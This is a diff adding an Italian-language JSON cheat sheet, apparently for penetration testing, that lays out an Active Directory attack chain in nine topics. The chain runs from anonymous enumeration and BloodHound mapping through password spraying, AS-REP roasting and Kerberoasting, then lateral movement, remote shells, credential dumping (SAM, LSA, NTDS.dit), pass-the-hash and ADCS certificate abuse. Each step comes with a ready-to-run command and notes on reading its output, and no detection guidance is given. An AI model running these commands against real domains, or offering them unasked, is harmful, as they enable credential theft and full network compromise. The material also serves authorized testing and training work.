@@ -1,0 +1,215 @@
+{
+  "source": "curato a mano",
+  "topics": [
+    {
+      "kind": "ad",
+      "name": "Enumerazione del dominio",
+      "description": "Raccogliere utenti, gruppi, share e policy (con o senza credenziali).",
+      "intro": "Il primo passo in Active Directory e' capire com'e' fatto il dominio: utenti, gruppi, share, policy delle password, relazioni di fiducia.\nSi parte da quello che si ha: a volte nulla (si tenta l'accesso anonimo), a volte un utente di basso livello. Anche un singolo account 'normale' permette di enumerare quasi tutto il dominio via SMB e LDAP.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Enumerazione senza credenziali",
+          "goal": "Vedere cosa e' accessibile in modo anonimo.",
+          "tool": "netexec / enum4linux-ng",
+          "command": "netexec smb <dc-ip> -u '' -p ''    # e:  enum4linux-ng -A <dc-ip>",
+          "interpretation": "Rivela OS, nome del dominio e, se abilitata, la null session (utenti/share senza credenziali).",
+          "references": null
+        },
+        {
+          "title": "Enumerazione con credenziali",
+          "goal": "Elencare utenti, gruppi e share del dominio.",
+          "tool": "netexec",
+          "command": "netexec smb <dc-ip> -u <user> -p <pass> --users --groups --shares",
+          "interpretation": "Lista completa di utenti e gruppi: base per spraying, roasting e per individuare account privilegiati.",
+          "references": null
+        },
+        {
+          "title": "Interrogazione LDAP",
+          "goal": "Leggere oggetti e attributi dalla directory.",
+          "tool": "ldapsearch",
+          "command": "ldapsearch -x -H ldap://<dc-ip> -D '<user>@acme.local' -w '<pass>' -b 'DC=acme,DC=local'",
+          "interpretation": "Utenti, gruppi, computer e attributi (es. descrizioni con password, SPN, deleghe).",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "BloodHound",
+      "description": "Mappare le relazioni del dominio e trovare i percorsi verso Domain Admin.",
+      "intro": "BloodHound raccoglie i dati del dominio e li mostra come un grafo: chi e' membro di cosa, chi ha controllo su chi, quali macchine. Serve a individuare i 'percorsi di attacco' non ovvi che portano da un utente qualsiasi fino a Domain Admin.\nPrima si raccolgono i dati (SharpHound / bloodhound-python), poi si analizzano nell'interfaccia.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Raccolta dati",
+          "goal": "Generare il dataset da caricare in BloodHound.",
+          "tool": "bloodhound-python",
+          "command": "bloodhound-python -d acme.local -u <user> -p <pass> -ns <dc-ip> -c All",
+          "interpretation": "Produce file JSON da importare in BloodHound (o un .zip con SharpHound da macchina Windows).",
+          "references": null
+        },
+        {
+          "title": "Analisi dei percorsi",
+          "goal": "Trovare la strada piu' breve verso i privilegi massimi.",
+          "tool": "BloodHound",
+          "command": "Importa i dati, poi usa la query 'Shortest Paths to Domain Admins'",
+          "interpretation": "Evidenzia catene sfruttabili (appartenenze, ACL, sessioni): la mappa di cosa attaccare.",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "Password spraying",
+      "description": "Provare poche password comuni su molti utenti, evitando il blocco account.",
+      "intro": "A differenza del brute force (molte password su un utente, che fa scattare il lockout), lo spraying prova 1-2 password molto comuni su TUTTI gli utenti del dominio. E' efficace perche' in ogni azienda qualcuno usa password prevedibili (es. nome dell'azienda + anno).\nVa fatto con prudenza, rispettando la policy di lockout per non bloccare account.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Spray con netexec",
+          "goal": "Testare una password comune su una lista di utenti.",
+          "tool": "netexec",
+          "command": "netexec smb <dc-ip> -u users.txt -p 'Acme2025!' --continue-on-success",
+          "interpretation": "Un '[+]' indica credenziali valide. Controlla prima la soglia di lockout (policy password).",
+          "references": null
+        },
+        {
+          "title": "Spray con kerbrute",
+          "goal": "Alternativa via Kerberos (piu' silenziosa).",
+          "tool": "kerbrute",
+          "command": "kerbrute passwordspray -d acme.local --dc <dc-ip> users.txt 'Acme2025!'",
+          "interpretation": "Valido/non valido per ogni utente, senza generare eventi di logon tradizionali.",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "AS-REP Roasting",
+      "description": "Ottenere hash crackabili dagli utenti senza pre-autenticazione Kerberos.",
+      "intro": "Alcuni account hanno l'opzione 'non richiedere la pre-autenticazione Kerberos'. Per questi, chiunque puo' richiedere un messaggio AS-REP il cui hash e' crackabile offline, SENZA conoscere la password e spesso senza alcuna credenziale.\nE' un attacco rapido da provare in fase iniziale.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Estrazione hash AS-REP",
+          "goal": "Trovare utenti senza preauth e prenderne l'hash.",
+          "tool": "impacket-GetNPUsers",
+          "command": "impacket-GetNPUsers acme.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip>",
+          "interpretation": "Un hash '$krb5asrep$' si cracca offline (hashcat -m 18200). Password debole = credenziali valide.",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "Kerberoasting",
+      "description": "Crackare le password degli account di servizio (con SPN) offline.",
+      "intro": "Gli account di servizio hanno un SPN (Service Principal Name). Qualsiasi utente autenticato puo' richiedere un ticket di servizio (TGS) per quegli account: il ticket contiene un hash crackabile offline.\nGli account di servizio hanno spesso password deboli e non scadono mai: per questo il Kerberoasting e' uno degli attacchi piu' redditizi in AD. Richiede un account valido.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Richiesta e estrazione TGS",
+          "goal": "Prendere gli hash degli account con SPN.",
+          "tool": "impacket-GetUserSPNs",
+          "command": "impacket-GetUserSPNs acme.local/<user>:<pass> -dc-ip <dc-ip> -request",
+          "interpretation": "Gli hash '$krb5tgs$' si crackano offline (hashcat -m 13100). Spesso rivelano password di servizio deboli.",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "Movimento laterale ed esecuzione",
+      "description": "Con credenziali o hash, eseguire comandi su altre macchine del dominio.",
+      "intro": "Una volta ottenute delle credenziali (o un hash), l'obiettivo e' usarle per spostarsi su altre macchine ed eseguire comandi, avvicinandosi ai sistemi di valore. I protocolli piu' usati sono SMB (psexec/wmiexec) e WinRM.\nPrima si verifica DOVE quelle credenziali danno accesso, poi si ottiene una shell.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Dove ho accesso?",
+          "goal": "Verificare su quali host le credenziali funzionano.",
+          "tool": "netexec",
+          "command": "netexec smb <subnet>/24 -u <user> -p <pass>",
+          "interpretation": "'(Pwn3d!)' indica privilegi amministrativi su quell'host (esecuzione comandi possibile).",
+          "references": null
+        },
+        {
+          "title": "Shell / esecuzione",
+          "goal": "Ottenere una shell su una macchina accessibile.",
+          "tool": "impacket / evil-winrm",
+          "command": "impacket-psexec acme.local/<user>:<pass>@<ip>    # o:  evil-winrm -i <ip> -u <user> -p <pass>",
+          "interpretation": "Shell remota con i privilegi dell'utente: da qui si cercano credenziali e si prosegue.",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "Dump delle credenziali",
+      "description": "Estrarre hash e segreti da una macchina compromessa.",
+      "intro": "Ottenuto l'accesso privilegiato a una macchina, si estraggono le credenziali li' presenti: hash locali (SAM), segreti (LSA), credenziali in memoria (LSASS) e, su un Domain Controller, l'intero database del dominio (NTDS.dit).\nLe credenziali raccolte alimentano nuovi accessi (riuso, Pass-the-Hash): e' il motore della progressione in AD.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Segreti locali",
+          "goal": "Prendere hash SAM e segreti LSA.",
+          "tool": "netexec / secretsdump",
+          "command": "netexec smb <ip> -u <user> -p <pass> --sam --lsa    # o:  impacket-secretsdump acme.local/<user>:<pass>@<ip>",
+          "interpretation": "Hash NTLM locali e segreti (spesso password di servizio in chiaro). Riutilizzali altrove.",
+          "references": null
+        },
+        {
+          "title": "Dump del dominio (NTDS)",
+          "goal": "Da Domain Admin, estrarre tutti gli hash del dominio.",
+          "tool": "secretsdump",
+          "command": "impacket-secretsdump acme.local/<admin>:<pass>@<dc-ip> -just-dc",
+          "interpretation": "Tutti gli hash degli utenti di dominio: compromissione totale. Da usare solo a obiettivo raggiunto.",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "Pass-the-Hash",
+      "description": "Autenticarsi con l'hash NTLM, senza conoscere la password.",
+      "intro": "In Windows, per autenticarsi via NTLM basta l'hash della password, non la password in chiaro. Se hai ottenuto un hash (es. dal dump credenziali), puoi usarlo direttamente per accedere ad altri sistemi dove quell'utente e' valido.\nE' il motivo per cui un singolo hash amministrativo riutilizzato puo' compromettere molte macchine.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Accesso con hash",
+          "goal": "Usare l'hash NTLM al posto della password.",
+          "tool": "netexec / impacket",
+          "command": "netexec smb <ip> -u <user> -H <NTLM-hash>    # o:  impacket-psexec -hashes :<NTLM> acme.local/<user>@<ip>",
+          "interpretation": "Se ottieni accesso/'(Pwn3d!)', l'hash e' valido su quell'host: movimento laterale senza crackare nulla.",
+          "references": null
+        }
+      ]
+    },
+    {
+      "kind": "ad",
+      "name": "ADCS - certificati (ESC)",
+      "description": "Abusare di template di certificato mal configurati per l'escalation.",
+      "intro": "Active Directory Certificate Services (ADCS) rilascia certificati. Se i template sono configurati male, un utente poco privilegiato puo' richiedere un certificato che gli permette di autenticarsi come un altro utente (anche Domain Admin).\nSono le famose tecniche 'ESC1', 'ESC8', ecc.: spesso una via rapida verso il dominio quando ADCS e' presente.",
+      "detection": null,
+      "references": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
+      "checks": [
+        {
+          "title": "Trova template vulnerabili",
+          "goal": "Individuare configurazioni ESC sfruttabili.",
+          "tool": "certipy",
+          "command": "certipy find -u <user>@acme.local -p <pass> -dc-ip <dc-ip> -vulnerable",
+          "interpretation": "Elenca i template vulnerabili (ESC1, ESC8...). Ognuno ha una tecnica di abuso documentata per l'escalation.",
+          "references": null
+        }
+      ]
+    }
+  ]
+}
